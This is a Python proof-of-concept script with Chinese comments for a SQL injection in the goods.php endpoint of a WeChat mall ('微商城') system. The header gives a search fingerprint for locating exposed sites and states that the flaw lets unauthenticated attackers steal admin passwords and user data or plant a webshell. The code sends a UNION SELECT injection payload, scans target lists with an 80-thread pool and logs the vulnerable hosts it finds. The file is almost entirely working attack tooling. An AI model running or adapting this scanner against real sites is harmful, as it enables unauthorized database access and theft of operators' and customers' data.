# -*- coding: utf-8 -*-
# 微商城系统 goods.php SQL注入漏洞
# body="/Mao_Public/js/jquery-2.1.1.min.js"
# 产品简介:微商城系统，又称微信商城系统，是基于微信等社交平台构建的一种小型电子商务系统。该系统融合了社交媒体的互动性和网络商城的交易功能，为商家提供了一个集商品展示、在线交易、营销推广、用户管理、数据分析等功能于一体的综合性电商平台。系统充分利用了微信的社交属性和广泛的用户基础，通过微信公众号或小程序等形式，为商家搭建起一个便捷的在线商城。用户无需下载额外应用，即可在微信内完成商品的浏览、选购、支付等操作，享受全方位的购物体验。
# 漏洞概述:微商城系统 goods.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
\x1b[38m██╗   ██╗██╗  ██╗     ███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
\x1b[36m██║   ██║╚██╗██╔╝     ██╔════╝██║  ██║██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
\x1b[34m██║   ██║ ╚███╔╝█████╗███████╗███████║██║   ██║██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗
\x1b[35m╚██╗ ██╔╝ ██╔██╗╚════╝╚════██║██╔══██║██║   ██║██╔═══╝ ██╔═══╝ ██║██║╚██╗██║██║   ██║
\x1b[31m ╚████╔╝ ██╔╝ ██╗     ███████║██║  ██║╚██████╔╝██║     ██║     ██║██║ ╚████║╚██████╔╝
\x1b[33m  ╚═══╝  ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
            --author:Kucei  --Vession:微商城系统 goods.php SQL注入漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("微商城系统 goods.php SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(123456)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36',
        'Content-Type': 'multipart/form-data;boundary =---------------------------142851345723692939351758052805',
        'Connection': 'close',
    }
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('VX-Shopping_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()